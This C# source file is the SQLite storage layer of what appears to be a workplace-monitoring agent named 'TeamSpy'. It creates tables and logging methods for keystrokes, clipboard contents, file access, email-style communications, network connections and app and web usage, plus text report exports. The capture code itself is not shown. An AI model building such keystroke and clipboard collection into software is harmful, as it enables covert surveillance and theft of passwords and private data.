using Microsoft.Data.Sqlite;
using System;
using System.IO;

namespace TeamSpy.Agent
{
    public class DatabaseManager
    {
        private readonly string _databasePath;

        public DatabaseManager(string dbName)
        {
            _databasePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, dbName);
            InitializeDatabase();
        }

        private void InitializeDatabase()
        {
            using (var connection = new SqliteConnection($"Data Source={_databasePath}"))
            {
                connection.Open();
                var command = connection.CreateCommand();
                command.CommandText =
                @"
                    CREATE TABLE IF NOT EXISTS SessionEvents (
                        Timestamp TEXT NOT NULL,
                        EventType TEXT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS AppUsage (
                        Timestamp TEXT NOT NULL,
                        ProcessName TEXT NOT NULL,
                        WindowTitle TEXT NOT NULL,
                        Duration INT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS WebUsage (
                        Timestamp TEXT NOT NULL,
                        URL TEXT NOT NULL,
                        Duration INT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS Keystrokes (
                        Timestamp TEXT NOT NULL,
                        Keystroke TEXT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS Clipboard (
                        Timestamp TEXT NOT NULL,
                        Content TEXT NOT NULL
                    );
                    CREATE TABLE IF NOT EXISTS FileAccess (
                        Timestamp TEXT NOT NULL,
                        EventType TEXT NOT NULL,
                        FilePath TEXT NOT NULL,
                        Details TEXT
                    );
                    CREATE TABLE IF NOT EXISTS Communication (
                        Timestamp TEXT NOT NULL,
                        Type TEXT NOT NULL,
                        Sender TEXT, 
                        Recipient TEXT, 
                        Subject TEXT
                    );
                    CREATE TABLE IF NOT EXISTS NetworkActivity (
                        Timestamp TEXT NOT NULL,
                        User TEXT NOT NULL,
                        DestinationIp TEXT NOT NULL,
                        Port INT NOT NULL,
                        Domain TEXT
                    );
                ";
                command.ExecuteNonQuery();
            }
        }

        public void LogSessionEvent(DateTime timestamp, string eventType)
        {
            Log("INSERT INTO SessionEvents (Timestamp, EventType) VALUES ($timestamp, $eventType);",
                ("$timestamp", timestamp.ToString("o")),
                ("$eventType", eventType));
        }

        public void LogAppUsage(DateTime timestamp, string processName, string windowTitle, int duration)
        {
            Log("INSERT INTO AppUsage (Timestamp, ProcessName, WindowTitle, Duration) VALUES ($timestamp, $processName, $windowTitle, $duration);",
                ("$timestamp", timestamp.ToString("o")),
                ("$processName", processName),
                ("$windowTitle", windowTitle),
                ("$duration", duration));
        }

        public void LogWebUsage(DateTime timestamp, string url, int duration)
        {
            Log("INSERT INTO WebUsage (Timestamp, URL, Duration) VALUES ($timestamp, $url, $duration);",
                ("$timestamp", timestamp.ToString("o")),
                ("$url", url),
                ("$duration", duration));
        }

        public void LogKeystroke(DateTime timestamp, string keystroke)
        {
            Log("INSERT INTO Keystrokes (Timestamp, Keystroke) VALUES ($timestamp, $keystroke);",
                ("$timestamp", timestamp.ToString("o")),
                ("$keystroke", keystroke));
        }

        public void LogClipboardChange(DateTime timestamp, string content)
        {
            Log("INSERT INTO Clipboard (Timestamp, Content) VALUES ($timestamp, $content);",
                ("$timestamp", timestamp.ToString("o")),
                ("$content", content));
        }

        public void LogFileActivity(DateTime timestamp, string eventType, string filePath, string? details)
        {
            Log("INSERT INTO FileAccess (Timestamp, EventType, FilePath, Details) VALUES ($timestamp, $eventType, $filePath, $details);",
                ("$timestamp", timestamp.ToString("o")),
                ("$eventType", eventType),
                ("$filePath", filePath),
                ("$details", details ?? (object)DBNull.Value));
        }

        public void LogCommunication(DateTime timestamp, string type, string? sender, string? recipient, string? subject)
        {
            Log("INSERT INTO Communication (Timestamp, Type, Sender, Recipient, Subject) VALUES ($timestamp, $type, $sender, $recipient, $subject);",
                ("$timestamp", timestamp.ToString("o")),
                ("$type", type),
                ("$sender", sender ?? (object)DBNull.Value),
                ("$recipient", recipient ?? (object)DBNull.Value),
                ("$subject", subject ?? (object)DBNull.Value));
        }

        public void LogNetworkActivity(DateTime timestamp, string user, string destinationIp, int port, string? domain)
        {
            Log("INSERT INTO NetworkActivity (Timestamp, User, DestinationIp, Port, Domain) VALUES ($timestamp, $user, $destinationIp, $port, $domain);",
                ("$timestamp", timestamp.ToString("o")),
                ("$user", user),
                ("$destinationIp", destinationIp),
                ("$port", port),
                ("$domain", domain ?? (object)DBNull.Value));
        }

        private void Log(string sql, params (string, object)[] parameters)
        {
            try
            {
                using (var connection = new SqliteConnection($"Data Source={_databasePath}"))
                {
                    connection.Open();
                    var command = connection.CreateCommand();
                    command.CommandText = sql;
                    foreach (var p in parameters)
                    {
                        command.Parameters.AddWithValue(p.Item1, p.Item2);
                    }
                    command.ExecuteNonQuery();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Database Error: {ex.Message}");
            }
        }

        public void GenerateWebUsageReport()
        {
            GenerateReport("WebUsage", "Web Usage Report", "SELECT * FROM WebUsage ORDER BY Timestamp DESC");
        }

        public void GenerateAppUsageReport()
        {
            GenerateReport("AppUsage", "App Usage Report", "SELECT * FROM AppUsage ORDER BY Timestamp DESC");
        }

        public void GenerateSessionReport()
        {
            GenerateReport("SessionEvents", "Session Report", "SELECT * FROM SessionEvents ORDER BY Timestamp DESC");
        }

        public void GenerateKeyReport()
        {
            GenerateReport("Keystrokes", "Keystroke Report", "SELECT * FROM Keystrokes ORDER BY Timestamp DESC");
        }

        public void GenerateClipboardReport()
        {
            GenerateReport("Clipboard", "Clipboard Report", "SELECT * FROM Clipboard ORDER BY Timestamp DESC");
        }

        public void GenerateFileAccessReport()
        {
            GenerateReport("FileAccess", "File Access Report", "SELECT * FROM FileAccess ORDER BY Timestamp DESC");
        }

        public void GenerateCommunicationReport()
        {
            GenerateReport("Communication", "Communication Report", "SELECT * FROM Communication ORDER BY Timestamp DESC");
        }

        public void GenerateNetworkReport()
        {
            GenerateReport("NetworkActivity", "Network Report", "SELECT * FROM NetworkActivity ORDER BY Timestamp DESC");
        }

        private void GenerateReport(string reportName, string title, string sql)
        {
            string fileName = $"report.txt";
            using (var writer = new StreamWriter(fileName, false))
            {
                writer.WriteLine($"--- {title} ---");
                using (var connection = new SqliteConnection($"Data Source={_databasePath}"))
                {
                    connection.Open();
                    var command = connection.CreateCommand();
                    command.CommandText = sql;
                    using (var reader = command.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            for (int i = 0; i < reader.FieldCount; i++)
                            {
                                writer.Write($"{reader.GetName(i)}: {reader.GetValue(i)}\t");
                            }
                            writer.WriteLine();
                        }
                    }
                }
                writer.WriteLine($"--- End of Report ---");
            }
            Console.WriteLine($"{reportName} report generated: {fileName}");
        }
    }
}
